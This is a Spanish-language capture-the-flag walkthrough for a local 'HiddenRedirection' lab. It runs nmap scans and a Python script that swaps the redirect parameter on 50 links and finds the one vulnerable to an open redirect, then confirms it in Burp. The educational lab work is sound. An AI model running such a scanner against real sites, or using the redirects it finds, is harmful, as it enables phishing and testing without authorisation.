---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# HiddenRedirection BugBountyLabs (Principiante)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bugbountylabs_hiddenredirection.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
python3 bugbountylabs_hiddenredirection.py
```

Info:

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ██╗      █████╗ ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ██║     ███████║██████╔╝███████╗
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██║     ██╔══██║██╔══██╗╚════██║
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ███████╗██║  ██║██████╔╝███████║
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝

Fundadores
El Pingüino de Mario
Curiosidades De Hackers

Cofundadores
Zunderrub
CondorHacks
Lenam

Descargando la máquina hiddenredirection, espere por favor...

[########################################] 100%
Descarga completa.
La IP de la máquina hiddenredirection es -> 172.17.0.2

Presiona Ctrl+C para detener la máquina
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 07:46 CET
Nmap scan report for app.dl (172.17.0.2)
Host is up (0.000034s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 8.2.27)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Open Redirect Lab
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```

Vemos que tenemos un puerto `8080` en el que si entramos veremos exactamente `50` enlaces, nos indica que tendremos que descubrir cual de todos es vulnerable a un `OpenRedirect`.

Vamos a crearnos un script para ver que `URL` es la `vulnerable`:

> detectURL.py

```python
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from urllib.parse import urljoin, urlparse, parse_qs

# Configuración de colores en la terminal
console = Console()

# URL objetivo (modifica con la URL del CTF)
TARGET_URL = "http://<IP>:8080/"

# User-Agent para evitar bloqueos
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
}

def obtener_enlaces():
    """Extrae todos los enlaces de la página objetivo."""
    console.print("[bold cyan]📡 Escaneando enlaces en:[/bold cyan]", TARGET_URL)
    try:
        respuesta = requests.get(TARGET_URL, headers=HEADERS)
        respuesta.raise_for_status()
        soup = BeautifulSoup(respuesta.text, "html.parser")

        # Extraer enlaces que contengan 'redir.php?'
        enlaces = [urljoin(TARGET_URL, a["href"]) for a in soup.find_all("a", href=True) if "redir.php?" in a["href"]]
        
        console.print(f"[bold green]🔍 Se encontraron {len(enlaces)} enlaces[/bold green]")
        return enlaces

    except requests.RequestException as e:
        console.print(f"[bold red]❌ Error al obtener la página:[/bold red] {e}")
        return []

def modificar_enlace(url):
    """Modifica la URL para intentar la redirección a Google."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    if "redirect" in query_params:
        query_params["redirect"] = ["https://google.es"]

    new_query = "&".join(f"{k}={v[0]}" for k, v in query_params.items())
    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

    return new_url

def probar_enlaces(enlaces):
    """Prueba cada enlace modificado y detecta Open Redirects."""
    table = Table(title="🔗 Resultados del escaneo", show_lines=True)
    table.add_column("ID", style="bold yellow", justify="center")
    table.add_column("Enlace Original", style="bold cyan")
    table.add_column("Enlace Modificado", style="bold magenta")
    table.add_column("Estado", style="bold green", justify="center")

    for i, link in enumerate(enlaces, start=1):
        link_modificado = modificar_enlace(link)

        try:
            respuesta = requests.get(link_modificado, headers=HEADERS, allow_redirects=False)

            if respuesta.status_code == 403:
                estado = "[red]❌ Bloqueado (403)[/red]"
            elif "Location" in respuesta.headers and "google.es" in respuesta.headers["Location"]:
                estado = "[green]✅ VULNERABLE (Redirige a Google)[/green]"
            else:
                estado = "[yellow]⚠️ No redirige[/yellow]"

            table.add_row(str(i), link, link_modificado, estado)

        except requests.RequestException:
            table.add_row(str(i), link, link_modificado, "[bold red]⚠️ Error[/bold red]")

    console.print(table)

if __name__ == "__main__":
    enlaces = obtener_enlaces()
    if enlaces:
        probar_enlaces(enlaces)
```

Ahora lo tendremos que ejecutar de la siguiente forma:

```shell
python3 detectURL.py
```

Info:

```
📡 Escaneando enlaces en: http://172.17.0.2:8080/
🔍 Se encontraron 50 enlaces
                                                                                    🔗 Resultados del escaneo
┏━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ ID ┃ Enlace Original                                                                ┃ Enlace Modificado                                                   ┃              Estado               ┃
┡━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 1  │ http://172.17.0.2:8080/redir.php?link=1&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=1&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 2  │ http://172.17.0.2:8080/redir.php?link=2&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=2&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 3  │ http://172.17.0.2:8080/redir.php?link=3&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=3&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 4  │ http://172.17.0.2:8080/redir.php?link=4&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=4&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 5  │ http://172.17.0.2:8080/redir.php?link=5&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=5&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 6  │ http://172.17.0.2:8080/redir.php?link=6&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=6&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 7  │ http://172.17.0.2:8080/redir.php?link=7&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=7&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 8  │ http://172.17.0.2:8080/redir.php?link=8&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=8&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 9  │ http://172.17.0.2:8080/redir.php?link=9&redirect=https://elrincondelhacker.es  │ http://172.17.0.2:8080/redir.php?link=9&redirect=https://google.es  │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 10 │ http://172.17.0.2:8080/redir.php?link=10&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=10&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 11 │ http://172.17.0.2:8080/redir.php?link=11&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=11&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 12 │ http://172.17.0.2:8080/redir.php?link=12&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=12&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 13 │ http://172.17.0.2:8080/redir.php?link=13&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=13&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 14 │ http://172.17.0.2:8080/redir.php?link=14&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=14&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 15 │ http://172.17.0.2:8080/redir.php?link=15&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=15&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 16 │ http://172.17.0.2:8080/redir.php?link=16&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=16&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 17 │ http://172.17.0.2:8080/redir.php?link=17&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=17&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 18 │ http://172.17.0.2:8080/redir.php?link=18&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=18&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 19 │ http://172.17.0.2:8080/redir.php?link=19&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=19&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 20 │ http://172.17.0.2:8080/redir.php?link=20&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=20&redirect=https://google.es │ ✅ VULNERABLE (Redirige a Google) │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 21 │ http://172.17.0.2:8080/redir.php?link=21&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=21&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 22 │ http://172.17.0.2:8080/redir.php?link=22&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=22&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 23 │ http://172.17.0.2:8080/redir.php?link=23&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=23&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 24 │ http://172.17.0.2:8080/redir.php?link=24&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=24&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 25 │ http://172.17.0.2:8080/redir.php?link=25&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=25&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 26 │ http://172.17.0.2:8080/redir.php?link=26&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=26&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 27 │ http://172.17.0.2:8080/redir.php?link=27&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=27&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 28 │ http://172.17.0.2:8080/redir.php?link=28&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=28&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 29 │ http://172.17.0.2:8080/redir.php?link=29&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=29&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 30 │ http://172.17.0.2:8080/redir.php?link=30&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=30&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 31 │ http://172.17.0.2:8080/redir.php?link=31&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=31&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 32 │ http://172.17.0.2:8080/redir.php?link=32&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=32&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 33 │ http://172.17.0.2:8080/redir.php?link=33&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=33&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 34 │ http://172.17.0.2:8080/redir.php?link=34&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=34&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 35 │ http://172.17.0.2:8080/redir.php?link=35&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=35&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 36 │ http://172.17.0.2:8080/redir.php?link=36&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=36&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 37 │ http://172.17.0.2:8080/redir.php?link=37&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=37&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 38 │ http://172.17.0.2:8080/redir.php?link=38&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=38&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 39 │ http://172.17.0.2:8080/redir.php?link=39&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=39&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 40 │ http://172.17.0.2:8080/redir.php?link=40&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=40&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 41 │ http://172.17.0.2:8080/redir.php?link=41&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=41&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 42 │ http://172.17.0.2:8080/redir.php?link=42&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=42&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 43 │ http://172.17.0.2:8080/redir.php?link=43&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=43&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 44 │ http://172.17.0.2:8080/redir.php?link=44&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=44&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 45 │ http://172.17.0.2:8080/redir.php?link=45&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=45&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 46 │ http://172.17.0.2:8080/redir.php?link=46&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=46&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 47 │ http://172.17.0.2:8080/redir.php?link=47&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=47&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 48 │ http://172.17.0.2:8080/redir.php?link=48&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=48&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 49 │ http://172.17.0.2:8080/redir.php?link=49&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=49&redirect=https://google.es │           ⚠️ No redirige           │
├────┼────────────────────────────────────────────────────────────────────────────────┼─────────────────────────────────────────────────────────────────────┼───────────────────────────────────┤
│ 50 │ http://172.17.0.2:8080/redir.php?link=50&redirect=https://elrincondelhacker.es │ http://172.17.0.2:8080/redir.php?link=50&redirect=https://google.es │           ⚠️ No redirige           │
└────┴────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────┴───────────────────────────────────┘
```

Vemos que el numero `20` es el vulnerable, por lo que vamos a probarlo de forma manual, abriremos `BurpSuite` y capturaremos la peticion dandole a al enlace del numero `20`.

Veremos algo asi:

```
GET /redir.php?link=20&redirect=https://google.es HTTP/1.1
Host: 172.17.0.2:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://172.17.0.2:8080/index.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Ahora si le damos a enviar con `google.es` y volvemos a donde le dimos en la pagina veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, por lo que habremos terminado la maquina pudiendo haber explotado la vulnerabilidad de `Open Redirect`.
